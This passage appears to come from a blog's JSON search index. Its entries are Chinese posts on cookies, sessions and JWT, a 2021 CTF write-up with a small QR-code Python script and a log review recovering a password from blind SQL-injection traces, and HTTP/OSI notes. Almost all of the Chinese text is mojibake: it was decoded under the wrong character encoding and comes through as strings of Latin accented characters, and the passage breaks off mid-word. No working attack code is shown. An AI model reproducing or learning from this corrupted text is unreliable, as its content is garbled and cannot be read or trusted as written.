çŠ¶æ€æ€§ï¼Œå¯¼è‡´æœåŠ¡å™¨æ”¶åˆ°å®¢æˆ·ç«¯è¯·æ±‚åå¾—åˆ°çš„éƒ½æ˜¯å…¨æ–°çš„è¯·æ±‚ï¼Œä¸çŸ¥é“å†å²è®°å½•ï¼Œä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä¾¿å¼•å…¥äº†cookieå’Œsessionæ¥å¼¥è¡¥è¿™ä¸ªä¸è¶³ã€‚ å…³äºsessionå®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯ä¼šä¸ºè¿™æ¬¡è¯·æ±‚å¼€è¾Ÿä¸€å—å†…å­˜ç©ºé—´ï¼Œè¿™ä¸ªå¯¹è±¡ä¾¿æ˜¯Sessionå¯¹è±¡ã€‚æœåŠ¡å™¨å¯ä»¥åˆ©ç”¨Sessionå­˜å‚¨å®¢æˆ·ç«¯åœ¨åŒä¸€ä¸ªä¼šè¯æœŸé—´çš„ä¸€äº›æ“ä½œè®°å½•ã€‚ è€Œsessionçš„å·¥ä½œåŸç†å°±æ˜¯ï¼šæœåŠ¡å™¨ç¬¬ä¸€æ¬¡æ¥å—åˆ°è¯·æ±‚åå¼€è¾Ÿä¸€å—ç©ºé—´ï¼ŒåŒæ—¶ç”Ÿæˆä¸€ä¸ªsessionIdï¼Œç„¶åé€šè¿‡å“åº”å¤´è®¾ç½®cookieï¼Œè¿™ä¸ªcookieä¼šæŒç»­åˆ°ä¼šè¯çš„ç»“æŸã€‚ ä½†æ˜¯sessionç©ºé—´åªèƒ½å¼€è¾Ÿåœ¨ä¸€ä¸ªæœåŠ¡å™¨ä¸­ï¼Œå¦‚æœè¯¥æœåŠ¡å™¨è´Ÿè½½å¯¼è‡´è½¬å‘åˆ°å¦ä¸€ä¸ªæœåŠ¡å™¨è®¿é—®ï¼Œsessionç©ºé—´å°†å¤±æ•ˆã€‚ å…³äºcookieæˆ‘ä»¬çš„è‡ªå®šä¹‰ä¸ªæ€§åŒ–ã€è´­ç‰©è½¦ã€è®°ä½å¯†ç ã€ç”¨æˆ·ç™»å½•ä¿æŒç­‰ç­‰åŠŸèƒ½çš„å®ç°ï¼Œéƒ½è¿ç”¨åˆ°äº†cookieã€‚cookieæ˜¯æœåŠ¡å™¨å‘é€åˆ°webæµè§ˆå™¨çš„ä¸€å°å—æ•°æ®ï¼Œæµè§ˆå™¨ä¼šå¯¹å…¶è¿›è¡Œå‚¨å­˜ï¼Œå¹¶ä¸ä¸‹ä¸€ä¸ªè¯·æ±‚ä¸€èµ·å‘é€è‡³æœåŠ¡å™¨ã€‚ cookieæ˜¯å¦‚ä½•è¢«åˆ›å»ºçš„å‘¢ï¼Ÿè¿™å°±è¦å¼•ç”¨å¤´æ–‡ä»¶ä¸­çš„Set-Cookieä¸Cookieæ ‡å¤´äº†ã€‚å®¢æˆ·ç«¯å‘é€httpè¯·æ±‚è¢«æœåŠ¡å™¨æ¥æ”¶ï¼Œè¿™æ—¶æœåŠ¡å™¨å¯ä»¥å‘é€æœ‰Set-Cookieçš„å“åº”å¤´ï¼Œè¿™ä¸ªå“åº”å¤´å°†cookieä»æœåŠ¡å™¨å‘é€åˆ°ç”¨æˆ·ä»£ç†ã€‚è¿™æ ·ï¼Œéšç€å¯¹æœåŠ¡å™¨çš„æ¯ä¸ªæ–°è¯·æ±‚ï¼Œæµè§ˆå™¨å°†ä½¿ç”¨Cookieå¤´æŠŠæ‰€æœ‰ä¹‹å‰å‚¨å­˜çš„Cookieå‘å›æœåŠ¡å™¨ã€‚ Cookieä¸€èˆ¬è¢«åˆ†ä¸ºä¸¤ç§ç±»å‹ï¼šä¼šè¯cookieï¼ˆSession Cookieï¼‰ä¸æ°¸ä¹…æ€§Cookieï¼ˆPersistent Cookieï¼‰ï¼š ä¼šè¯Cookieï¼šè¿™ç§ç±»å‹çš„cookieåœ¨å®¢æˆ·ç«¯å…³é—­åä¾¿ä¼šè‡ªåŠ¨åˆ é™¤ï¼Œæ­¤åæ°¸è¿œä¸¢å¤±ã€‚è¿™ç§ç±»å‹çš„cookieæ˜¯ä¸ä¼šå†™å…¥ç£ç›˜ä¸­çš„ï¼Œä¸è¿‡æœ‰äº›webæµè§ˆå™¨å¯èƒ½ä¼šä½¿ç”¨ä¼šè¯è¿›è¡Œè¿˜åŸã€‚ æ°¸ä¹…æ€§Cookieï¼šè¿™ç§ç±»å‹çš„cookieä¼šé€šè¿‡æŒ‡å®šExpiresæˆ–Max-AgeæŒ‡ä»¤æŒ‡å®šä¸€ä¸ªè¿‡æœŸæ—¶é—´ï¼Œå½“åˆ°è¾¾è¿‡æœŸæ—¶é—´åå†è¿›è¡Œåˆ é™¤ã€‚è¿™ç±»çš„cookieä¼šä¿å­˜è¿›å…¥ç£ç›˜å½“ä¸­ã€‚ å…³äºJSON Web Tokenï¼ˆJWTï¼‰æˆ‘ä»¬çŸ¥é“ç”±äºhttpçš„æ— çŠ¶æ€æ€§ï¼Œåœ¨ç½‘é¡µè®¿é—®å¤šä¸ªé¡µé¢æ—¶ï¼Œç™»å½•ä¿¡æ¯æ˜¯ä¸ä¼šè¢«ä¿å­˜çš„ï¼Œè¿™æ—¶ç”¨Session Cookieå°†ç™»å½•çŠ¶æ€ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œåœ¨ä¹‹ååˆ¤æ–­æ•°æ®ä¸è¯»å–çš„SessionIdæ˜¯å¦ç›¸åŒï¼Œä»¥å®ç°ç™»å½•çŠ¶æ€ä¿æŒã€‚ ä¸è¿‡è¿˜æœ‰ä¸€ç§è®¤è¯çš„æ–¹å¼ï¼Œå°±æ˜¯JWTã€‚ä¸åŒäºSession Cookieï¼ŒJWTå‚¨å­˜çš„ä¿¡æ¯æ˜¯ç»è¿‡æ•°å­—ç­¾åçš„ï¼Œå› æ­¤å®ƒçš„å®‰å…¨æ€§æ˜¯é«˜äºSession Cookieçš„ã€‚ä¸€èˆ¬å°†JWTç”¨æ¥è¿›è¡Œè®¤è¯ä¸ä¿¡æ¯ä¼ è¾“ã€‚å½“ç”¨æˆ·ç™»å½•ï¼Œåé¢æ¯ä¸ªè¯·æ±‚éƒ½ä¼šåŒ…å«JWTï¼Œä»è€Œå…è®¸ç”¨æˆ·è®¿é—®è¯¥ä»¤ç‰Œæ‰€å…è®¸çš„è·¯ç”±ã€æœåŠ¡å’Œèµ„æºã€‚ JWTçš„ç»„æˆæ ¼å¼JWTçš„ç»„æˆåˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼šHeader.Payload.Signature Header:JWTçš„æ ‡è®°å¤´ï¼ŒåŒ…æ‹¬ä»¤ç‰Œç±»å‹ä¸ç­¾åç®—æ³•ï¼Œé€šè¿‡Base64Urlç¼–ç ã€‚ Payloadï¼šåŒ…å«ä¸€ä¸ªå£°æ˜ï¼Œåˆ†ä¸ºregisteredï¼ˆé¢„å®šä¹‰å£°æ˜ï¼‰ã€publicï¼ˆå…¬å…±å£°æ˜ï¼‰ä¸privateï¼ˆè‡ªå®šä¹‰å£°æ˜ï¼‰ä¸‰ç±»ï¼Œé€šè¿‡Base64Urlç¼–ç ã€‚ Signatureï¼šç­¾è¯ä¿¡æ¯ï¼ŒåŒ…æ‹¬base64ç¼–ç åçš„Headerä¸payloadï¼Œä»¥åŠsecretã€‚ç­¾åç”¨äºéªŒè¯æ¶ˆæ¯æ˜¯å¦è¢«æ›´æ”¹ï¼Œå¦‚æœæ˜¯ç§é’¥ç­¾åçš„JWTè¿˜å¯ä»¥éªŒè¯å‘é€è€…èº«ä»½ã€‚ æ€»ç»“è®¤è¯†ç†è§£äº†sessionã€cookieä¸tokenä¹‹åï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥å­¦ä¹ xssã€CSRFã€SSRFç­‰æ¼æ´å¯ä»¥æ›´åŠ é¡ºåˆ©ï¼ŒåŒæ—¶å¯ä»¥åŠ æ·±æˆ‘ä»¬å¯¹ç½‘é¡µåŸç†çš„ç†è§£ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-http -web","slug":"http-web","permalink":"http://example.com/tags/http-web/"}]},{"title":"ã€é—½ç›¾æ¯2021ã€‘éƒ¨åˆ†wp","slug":"ã€é—½ç›¾æ¯2021ã€‘éƒ¨åˆ†wp","date":"2021-12-02T13:46:41.000Z","updated":"2021-12-06T11:16:37.222Z","comments":true,"path":"2021/12/02/ã€é—½ç›¾æ¯2021ã€‘éƒ¨åˆ†wp/","link":"","permalink":"http://example.com/2021/12/02/%E3%80%90%E9%97%BD%E7%9B%BE%E6%9D%AF2021%E3%80%91%E9%83%A8%E5%88%86wp/","excerpt":"å‰è¨€è¿˜æ˜¯å¤ªèœäº†ç°åœ¨ï¼Œweb1é‚£ä¸ªç»•è¿‡å°±æ˜¯æ²¡è§£å‡ºæ¥ï¼Œå·¥æ§å®³äººä¸æµ…å•Šï¼ˆã€‚æˆ‘è§£äº†æœ€ç®€å•çš„ä¸¤é¢˜miscï¼ŒæŠŠwpä¸‹ã€‚","text":"å‰è¨€è¿˜æ˜¯å¤ªèœäº†ç°åœ¨ï¼Œweb1é‚£ä¸ªç»•è¿‡å°±æ˜¯æ²¡è§£å‡ºæ¥ï¼Œå·¥æ§å®³äººä¸æµ…å•Šï¼ˆã€‚æˆ‘è§£äº†æœ€ç®€å•çš„ä¸¤é¢˜miscï¼ŒæŠŠwpä¸‹ã€‚ Signinä¸‹è½½é™„ä»¶ä¸‹æ¥å‘ç°æ˜¯ä¸€ä¸ªæ–‡æœ¬ï¼Œé‡Œé¢æ˜¯ä¸€ä¸²åªæœ‰0å’Œ1çš„æ•°å­—ç ï¼Œè€Œä¸”ä¸ªæ•°ä¸º250000ä¸ªï¼Œåˆšå¥½æ˜¯500*500ï¼Œå› æ­¤æ€€ç–‘è¿™é¢˜æ˜¯å°†æ•°å­—è½¬åŒ–ä¸ºäºŒç»´ç ï¼Œç¼–å†™è„šæœ¬ï¼š 1234567891011121314from PIL import ImageMAX = 500pic = Image.new(&quot;RGB&quot;,(MAX, MAX))str = é‚£ä¸²250000ä½æ•°å­—i=0for y in range (0,MAX): for x in range (0,MAX): if(str[i] == &#x27;1&#x27;): pic.putpixel([x,y],(0, 0, 0)) else: pic.putpixel([x,y],(255,255,255)) i = i+1pic.show()pic.save(&quot;flag.png&quot;) å¾—åˆ°äºŒç»´ç å›¾ç‰‡ï¼Œä½†æ˜¯ç¼ºäº†ä¸€è§’ï¼Œæˆ‘ä»¬å°†å…¶è¡¥å…¨ï¼š æ‰«ç å¾—å‡ºflagã€‚ æ—¥å¿—å®¡æŸ¥ä¸‹è½½é™„ä»¶æ˜¯ä¸€ä¸ªaccess.logï¼Œä¸€ä¸ªæ—¥å¿—æ–‡ä»¶ã€‚æˆ‘ä»¬ç”¨Notepad++æ‰“å¼€å¹¶è¿›è¡Œurlè§£ç ï¼Œå¾—åˆ°é˜…è¯»æ€§æ›´å¼ºçš„æ—¥å¿—ã€‚è§‚å¯Ÿæœ€å‰é¢å‡ æ¡è¯­å¥ï¼Œåˆ¤æ–­å½“è¿”å›é•¿åº¦ç­‰äº675æ—¶ä¸ºæ­£ç¡®å›æ˜¾ï¼Œè€Œé•¿åº¦ä¸º678åˆ™æ˜¯é”™è¯¯å›æ˜¾ã€‚æ ¹æ®é¢˜ç›®è¦æ±‚æˆ‘ä»¬æä¾›ç®¡ç†å‘˜çš„å¯†ç ï¼Œæˆ‘ä»¬æœç´¢å¯»æ‰¾passwordéƒ¨åˆ†å®¡è®¡ï¼š è¿™é‡Œä½¿ç”¨äº†äºŒåˆ†æ³•çŒœæµ‹åˆ¤æ–­æ¯ä¸€ä½asciiç å€¼ï¼Œå½“è¿™ä¸ªç å€¼å¤§äºçœŸå®å€¼è¿”å›678ä¸”å¤§äºï¼ˆçœŸå®å€¼-1ï¼‰çš„æ—¶å€™è¿”å›675å°±å¯ä»¥åˆ¤æ–­å‡ºè¯¥ä½çš„asciiç å€¼ï¼Œå¹¶å‚è€ƒè¡¨æ ¼å¯¹ç…§ã€‚å¯†ç æ€»å…±åä¸€ä½ï¼Œæ¯ä¸€ä½å¯¹åº”çš„asciiç å€¼åˆ†åˆ«ä¸ºï¼š110 103 106 102 100 115 85 98 100 75è½¬åŒ–æˆå¯†ç å³flagä¸ºï¼šngjfdsUbdK æ€»ç»“ä»Šå¹´ä¸æ˜¯åŸé¢˜æ¯äº†ï¼Œè€Œä¸”å¾ˆå¤šé¢˜ç›®éƒ½æŠ«ç€å·¥æ§çš„çš®ï¼Œä¸€ä¸‹è§‰å¾—ä¸é€‚åº”ã€‚è¿˜æ˜¯è¦å¤šæƒ³ã€å¤šåšã€å¤šç»ƒã€‚","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"-ctf -misc","slug":"ctf-misc","permalink":"http://example.com/tags/ctf-misc/"}]},{"title":"httpåè®®","slug":"httpåè®®","date":"2021-11-29T13:47:51.000Z","updated":"2021-12-01T08:27:19.886Z","comments":true,"path":"2021/11/29/httpåè®®/","link":"","permalink":"http://example.com/2021/11/29/http%E5%8D%8F%E8%AE%AE/","excerpt":"å‰è¨€httpåè®®çš„å­¦ä¹ æŒæ¡å¯¹æˆ‘ä»¬ç†è§£åº•å±‚åŸç†æœ‰ç›¸å½“å¤§çš„ä½œç”¨ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬æ›´å¥½åœ°è®¤è¯†webã€‚è¿™é‡Œåªå¯¹httpåšç²—ç•¥å­¦ä¹ ï¼Œå…·ä½“çš„ç†è§£åº”ç”¨éœ€è¦ç»“åˆå®æˆ˜ã€‚ä¸è¿‡ä½ è¿httpéƒ½ä¸ä¼šæ€ä¹ˆå¥½æ„æ€è¯´è‡ªå·±æ˜¯å­¦webçš„ï¼ˆps.è¿™ç¯‡åšå®¢åŒæ—¶å«æœ‰TCP/IPçš„ä¸‰æ¬¡æ¡æ‰‹ä¸å››æ¬¡æ¡æ‰‹ã€‚","text":"å‰è¨€httpåè®®çš„å­¦ä¹ æŒæ¡å¯¹æˆ‘ä»¬ç†è§£åº•å±‚åŸç†æœ‰ç›¸å½“å¤§çš„ä½œç”¨ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬æ›´å¥½åœ°è®¤è¯†webã€‚è¿™é‡Œåªå¯¹httpåšç²—ç•¥å­¦ä¹ ï¼Œå…·ä½“çš„ç†è§£åº”ç”¨éœ€è¦ç»“åˆå®æˆ˜ã€‚ä¸è¿‡ä½ è¿httpéƒ½ä¸ä¼šæ€ä¹ˆå¥½æ„æ€è¯´è‡ªå·±æ˜¯å­¦webçš„ï¼ˆps.è¿™ç¯‡åšå®¢åŒæ—¶å«æœ‰TCP/IPçš„ä¸‰æ¬¡æ¡æ‰‹ä¸å››æ¬¡æ¡æ‰‹ã€‚ äº†è§£HTTPHTTPï¼ˆHypertext Transfer Protocolï¼‰ï¼Œè¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼ŒæŒ‡çš„æ˜¯åœ¨è®¡ç®—æœºä¸–ç•Œä¸­ä¸“é—¨åœ¨ä¸¤ç‚¹ä¹‹é—´ä¼ è¾“è¶…æ–‡æœ¬æ•°æ®çš„è§„èŒƒã€‚ è¶…æ–‡æœ¬æŒ‡çš„æ˜¯ç°åœ¨è®¡ç®—æœºå¯ä»¥ä¼ è¾“æ–‡å­—ã€å›¾ç‰‡ã€éŸ³é¢‘ã€è§†é¢‘ï¼Œç”šè‡³ç‚¹å‡»æ–‡å­—æˆ–å›¾ç‰‡èƒ½å¤Ÿè¿›è¡Œè¶…é“¾æ¥çš„è·³è½¬ï¼Œæ–‡æœ¬çš„è¯­ä¹‰è¢«æ‰©å¤§åŒ–ï¼Œå› æ­¤è¢«ç§°ä¸ºè¶…æ–‡æœ¬ã€‚ ä¼ è¾“æŒ‡çš„æ˜¯ç”±ä¼ è¾“è½½ä½“è´Ÿè´£æŠŠäºŒè¿›åˆ¶æ•°æ®åŒ…ç”±è®¡ç®—æœºç»ˆç«¯ä¼ è¾“åˆ°å¦ä¸€ä¸ªç»ˆç«¯çš„è¿‡ç¨‹ã€‚é€šå¸¸æˆ‘ä»¬æŠŠä¼ è¾“æ•°æ®åŒ…çš„ä¸€æ–¹ç§°ä¸ºè¯·æ±‚æ–¹ï¼ŒæŠŠæ¥åˆ°äºŒè¿›åˆ¶æ•°æ®åŒ…çš„ä¸€æ–¹ç§°ä¸ºåº”ç­”æ–¹ã€‚è¯·æ±‚æ–¹å’Œåº”ç­”æ–¹å¯ä»¥è¿›è¡Œäº’æ¢ï¼Œè¯·æ±‚æ–¹ä¹Ÿå¯ä»¥ä½œä¸ºåº”ç­”æ–¹æ¥å—æ•°æ®ï¼Œåº”ç­”æ–¹ä¹Ÿå¯ä»¥ä½œä¸ºè¯·æ±‚æ–¹è¯·æ±‚æ•°æ®ã€‚ ç½‘ç»œåè®®æŒ‡çš„æ˜¯ç½‘ç»œä¸­ï¼ˆåŒ…æ‹¬äº’è”ç½‘ï¼‰ä¼ é€’ã€ç®¡ç†ä¿¡æ¯çš„ä¸€äº›è§„èŒƒã€‚ftpã€httpã€ftmpã€popã€tcp/ipè¿™äº›éƒ½æ˜¯ç½‘ç»œåè®®ã€‚ ç½‘ç»œæ¨¡å‹ä¸OSIæ¨¡å‹ç½‘ç»œæ¨¡å‹ä¸ºäº†ç»™ç½‘ç»œåè®®è®¾è®¡ç»“æ„ï¼Œè®¾è®¡è€…ä»¥åˆ†å±‚çš„æ–¹å¼è®¾è®¡ç»„ç»‡ç½‘ç»œåè®®ï¼Œæ¯ä¸ªåè®®å±äºå±‚æ¬¡æ¨¡å‹ä¹‹ä¸€ï¼Œä¸”æ¯ä¸€å±‚éƒ½å‘å…¶ä¸Šä¸€å±‚æä¾›æœåŠ¡ã€‚æ¯ä¸ªåˆ†å±‚ä¸­æ‰€æœ‰åè®®è¢«ç§°ä¸ºåè®®æ ˆï¼Œå› ç‰¹ç½‘åè®®æ ˆåˆ†ä¸ºäº”ä¸ªéƒ¨åˆ†ï¼šç‰©ç†å±‚ã€é“¾è·¯å±‚ã€ç½‘ç»œå±‚ã€è¿è¾“å±‚å’Œåº”ç”¨å±‚ã€‚ åº”ç”¨å±‚åº”ç”¨å±‚æ˜¯ç½‘ç»œåº”ç”¨ç¨‹åºå’Œç½‘ç»œåè®®å­˜æ”¾çš„åˆ†å±‚ã€‚åº”ç”¨å±‚åè®®åˆ†å¸ƒåœ¨å¤šä¸ªç«¯ç³»ç»Ÿä¸Šä¸€ä¸ªç«¯ç³»ç»Ÿåº”ç”¨ç¨‹åºä¸å¦å¤–ä¸€ä¸ªç«¯ç³»ç»Ÿåº”ç”¨ç¨‹åºäº¤æ¢ä¿¡æ¯åˆ†ç»„ï¼Œæˆ‘ä»¬æŠŠä½äºåº”ç”¨å±‚çš„ä¿¡æ¯åˆ†ç»„ç§°ä¸ºæŠ¥æ–‡(message)ã€‚å¸¸ç”¨çš„HTTPåè®®ã€FTPåè®®ç­‰ç­‰éƒ½åœ¨è¿™ä¸€å±‚ä¸­ã€‚ è¿è¾“å±‚è¿è¾“å±‚åœ¨åº”ç”¨ç¨‹åºæ–­ç‚¹ä¹‹é—´ä¼ é€åº”ç”¨ç¨‹åºæŠ¥æ–‡ã€‚è¿™ä¸€å±‚ä¸­ä¸»è¦ç”¨åˆ°çš„æ˜¯TCPåè®®ä¸UDPåè®®ï¼Œæˆ‘ä»¬æŠŠè¿è¾“å±‚çš„åˆ†ç»„ç§°ä¸ºæŠ¥æ–‡æ®µ(segment)ã€‚ TCPæ˜¯é¢å‘è¿æ¥çš„ã€å¯é çš„æµåè®®ã€‚æµå°±æ˜¯æŒ‡ä¸é—´æ–­çš„æ•°æ®ç»“æ„ï¼Œå½“åº”ç”¨ç¨‹åºé‡‡ç”¨TCPå‘é€æ¶ˆæ¯æ—¶ï¼Œè™½ç„¶å¯ä»¥ä¿è¯å‘é€çš„é¡ºåºï¼Œä½†è¿˜æ˜¯çŠ¹å¦‚æ²¡æœ‰ä»»ä½•é—´éš”çš„æ•°æ®æµå‘é€ç»™æ¥æ”¶ç«¯ã€‚UDPæ˜¯ä¸å…·æœ‰å¯é æ€§çš„æ•°æ®æŠ¥åè®®ã€‚ç»†å¾®çš„å¤„ç†å®ƒä¼šäº¤ç»™ä¸Šå±‚çš„åº”ç”¨å»å®Œæˆã€‚åœ¨UDPçš„æƒ…å†µä¸‹ï¼Œè™½ç„¶å¯ä»¥ç¡®ä¿å‘é€æ¶ˆæ¯çš„å¤§å°ï¼Œå´ä¸èƒ½ä¿è¯æ¶ˆæ¯ä¸€å®šä¼šåˆ°è¾¾ã€‚ ç½‘ç»œå±‚ç½‘ç»œå±‚è´Ÿè´£å°†æ•°æ®æŠ¥çš„ç½‘ç»œåˆ†å±‚ä»ä¸€å°ä¸»æœºç§»åŠ¨åˆ°å¦ä¸€å°ä¸»æœºï¼Œæ‰€æœ‰å…·æœ‰ç½‘ç»œå±‚çš„å› ç‰¹ç½‘ç»„ä»¶éƒ½å¿…é¡»è¿è¡ŒIPåè®®ï¼Œå› æ­¤ä¸€èˆ¬æŠŠç½‘ç»œå±‚ç§°ä¸ºIPå±‚ã€‚ é“¾è·¯å±‚ä¸ºäº†å°†åˆ†ç»„ä»ä¸€ä¸ªèŠ‚ç‚¹è¿è¾“åˆ°å¦ä¸€ä¸ªèŠ‚ç‚¹ï¼Œç½‘ç»œå±‚å¿…é¡»ä¾é é“¾è·¯å±‚æä¾›æœåŠ¡ã€‚é“¾è·¯å±‚çš„ä¾‹å­åŒ…æ‹¬ä»¥å¤ªç½‘ã€WiFiå’Œç”µç¼†æ¥å…¥çš„DOCSISåè®®ï¼Œå› ä¸ºæ•°æ®ä»æºç›®çš„åœ°ä¼ é€é€šå¸¸éœ€è¦ç»è¿‡å‡ æ¡é“¾è·¯ï¼Œä¸€ä¸ªæ•°æ®åŒ…å¯èƒ½è¢«æ²¿é€”ä¸åŒçš„é“¾è·¯å±‚åè®®å¤„ç†ï¼Œæˆ‘ä»¬æŠŠé“¾è·¯å±‚çš„åˆ†ç»„ç§°ä¸ºå¸§(frame)ã€‚ ç‰©ç†å±‚ç‰©ç†å±‚çš„ä½œç”¨æ˜¯å°†å¸§ä¸­çš„ä¸€ä¸ªä¸ªæ¯”ç‰¹ä»ä¸€ä¸ªèŠ‚ç‚¹è¿è¾“åˆ°å¦ä¸€ä¸ªèŠ‚ç‚¹ï¼Œç‰©ç†å±‚çš„åè®®ä»ç„¶ä½¿ç”¨é“¾è·¯å±‚åè®®ã€‚ OSIæ¨¡å‹ISOæå‡ºæ¥è®¡ç®—æœºç½‘ç»œåº”è¯¥æŒ‰ç…§7å±‚æ¥ç»„ç»‡ï¼ŒOSIè¦æ¯”ä¸Šé¢çš„ç½‘ç»œæ¨¡å‹å¤šäº†è¡¨ç¤ºå±‚å’Œä¼šè¯å±‚ï¼Œå…¶ä»–å±‚åŸºæœ¬ä¸€è‡´ã€‚ è¡¨ç¤ºå±‚ä¸»è¦åŒ…æ‹¬æ•°æ®å‹ç¼©å’Œæ•°æ®åŠ å¯†ä»¥åŠæ•°æ®æè¿°ï¼Œæ•°æ®æè¿°ä½¿å¾—åº”ç”¨ç¨‹åºä¸å¿…æ‹…å¿ƒè®¡ç®—æœºå†…éƒ¨å­˜å‚¨æ ¼å¼çš„é—®é¢˜ã€‚ ä¼šè¯å±‚æä¾›äº†æ•°æ®äº¤æ¢çš„å®šç•Œå’ŒåŒæ­¥åŠŸèƒ½ï¼ŒåŒ…æ‹¬å»ºç«‹æ£€æŸ¥ç‚¹å’Œæ¢å¤æ–¹æ¡ˆã€‚ HTTPå·¥ä½œæµç¨‹0ã€åŸå§‹çŠ¶æ€ï¼šå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´æ²¡æœ‰å…³ç³»1ã€å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´å»ºç«‹è¿æ¥ï¼Œå‘é€è¯·æ±‚2ã€æœåŠ¡å™¨æ¥å—è¯·æ±‚ï¼Œè¿”å›å“åº”ä¿¡æ¯3ã€é‡Šæ”¾è¿æ¥TCPè¿æ¥4ã€å®¢æˆ·ç«¯æ”¶åˆ°å“åº”ï¼ˆä¸€èˆ¬ä¸ºHtmlä»£ç ï¼‰å¹¶è§£æå†…å®¹5ã€å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨æ–­å¼€è¿æ¥ HTTPè¯·æ±‚ç‰¹å¾ ç®€å•å¿«é€Ÿï¼šå®¢æˆ·å‘æœåŠ¡å™¨è¯·æ±‚æœåŠ¡æ—¶ï¼Œåªéœ€ä¼ é€è¯·æ±‚æ–¹æ³•å’Œè·¯å¾„ã€‚è¯·æ±‚æ–¹æ³•å¸¸ç”¨çš„æœ‰ GETã€HEADã€POSTã€‚æ¯ç§æ–¹æ³•è§„å®šäº†å®¢æˆ·ä¸æœåŠ¡å™¨è”ç³»çš„ç±»å‹ä¸åŒã€‚ç”±äºHTTPåè®®ç®€å•ï¼Œä½¿å¾— HTTP æœåŠ¡å™¨çš„ç¨‹åºè§„æ¨¡å°ï¼Œå› è€Œé€šä¿¡é€Ÿåº¦å¾ˆå¿«ã€‚ çµæ´»ï¼šHTTPå…è®¸ä¼ è¾“ä»»æ„ç±»å‹çš„æ•°æ®å¯¹è±¡ã€‚æ­£åœ¨ä¼ è¾“çš„ç±»å‹ç”±Content-TypeåŠ ä»¥æ ‡è®°ã€‚ æ— è¿æ¥ï¼šæ— è¿æ¥çš„å«ä¹‰æ˜¯é™åˆ¶æ¯æ¬¡è¿æ¥åªå¤„ç†ä¸€ä¸ªè¯·æ±‚ã€‚æœåŠ¡å™¨å¤„ç†å®Œå®¢æˆ·çš„è¯·æ±‚ï¼Œå¹¶æ”¶åˆ°å®¢æˆ·çš„åº”ç­”åï¼Œå³æ–­å¼€è¿æ¥ã€‚é‡‡ç”¨è¿™ç§æ–¹å¼å¯ä»¥èŠ‚çœä¼ è¾“æ—¶é—´ã€‚ æ— çŠ¶æ€ï¼šHTTPåè®®æ˜¯æ— çŠ¶æ€åè®®ã€‚æ— çŠ¶æ€æ˜¯æŒ‡åè®®å¯¹äºäº‹åŠ¡å¤„ç†æ²¡æœ‰è®°å¿†èƒ½åŠ›ã€‚ç¼ºå°‘çŠ¶æ€æ„å‘³ç€å¦‚æœåç»­å¤„ç†éœ€è¦å‰é¢çš„ä¿¡æ¯ï¼Œåˆ™å®ƒå¿…é¡»é‡ä¼ ï¼Œè¿™æ ·å¯èƒ½å¯¼è‡´æ¯æ¬¡è¿æ¥ä¼ é€çš„æ•°æ®é‡å¢å¤§ã€‚å¦ä¸€æ–¹é¢ï¼Œåœ¨æœåŠ¡å™¨ä¸éœ€è¦å…ˆå‰ä¿¡æ¯æ—¶å®ƒçš„åº”ç­”å°±è¾ƒå¿«ã€‚ HTTPè¯·æ±‚ä¿¡æ¯ä¸å“åº”ä¿¡æ¯æ ¼å¼è¯·æ±‚ï¼š1ã€è¯·æ±‚è¡Œï¼ˆ1ï¼‰è¯·æ±‚æ–¹æ³•ï¼ˆ2ï¼‰è¯·æ±‚èµ„æºè·¯å¾„ï¼ˆURLçš„ä¸€éƒ¨åˆ†ï¼‰ï¼ˆ3ï¼‰æ‰€ç”¨åè®®åŠç‰ˆæœ¬2ã€è¯·æ±‚å¤´éƒ¨ä¿¡æ¯key:value3ã€ç©ºè¡Œï¼ˆä¸€å®šè¦æœ‰ï¼‰4ã€è¯·æ±‚ä¸»ä½“ä¿¡æ¯ å“åº”ï¼š1ã€çŠ¶æ€è¡Œï¼šåè®®ç‰ˆæœ¬ çŠ¶æ€ç  çŠ¶æ€æ–‡å­—2ã€æ¶ˆæ¯æŠ±å¤´key:value3.ç©ºè¡Œï¼ˆä¸€å®šè¦æœ‰ï¼‰4ã€å“åº”ä¸»ä½“ä¿¡æ¯ å…³äºè¯·æ±‚æ–¹æ³•1ã€OPTIONSè¿”å›æœåŠ¡å™¨é’ˆå¯¹ç‰¹å®šèµ„æºæ‰€æ”¯æŒçš„HTTPè¯·æ±‚æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨å‘webæœåŠ¡å™¨å‘é€â€˜*â€™çš„è¯·æ±‚æ¥æµ‹è¯•æœåŠ¡å™¨çš„åŠŸèƒ½æ€§2ã€HEADå‘æœåŠ¡å™¨ç´¢ä¸GETè¯·æ±‚ç›¸ä¸€è‡´çš„å“åº”ï¼Œåªä¸è¿‡å“åº”ä½“å°†ä¸ä¼šè¢«è¿”å›ã€‚è¿™ä¸€æ–¹æ³•å¯ä»¥å†ä¸å¿…ä¼ è¾“æ•´ä¸ªå“åº”å†…å®¹çš„æƒ…å†µä¸‹ï¼Œå°±å¯ä»¥è·å–åŒ…å«åœ¨å“åº”å°æ¶ˆæ¯å¤´ä¸­çš„å…ƒä¿¡æ¯ã€‚3ã€GETå‘ç‰¹å®šçš„èµ„æºå‘å‡ºè¯·æ±‚ã€‚4ã€POSTå‘æŒ‡å®šèµ„æºæäº¤æ•°æ®è¿›è¡Œå¤„ç†è¯·æ±‚ï¼ˆä¾‹å¦‚æäº¤è¡¨å•æˆ–è€…ä¸Šä¼ æ–‡ä»¶ï¼‰ï¼Œæ•°æ®è¢«åŒ…å«åœ¨è¯·æ±‚ä½“ä¸­ã€‚5ã€PUTå‘æŒ‡å®šèµ„æºä½ç½®ä¸Šä¼ å…¶æœ€æ–°å†…å®¹6ã€DELETEè¯·æ±‚æœåŠ¡å™¨åˆ é™¤Request-URLæ‰€æ 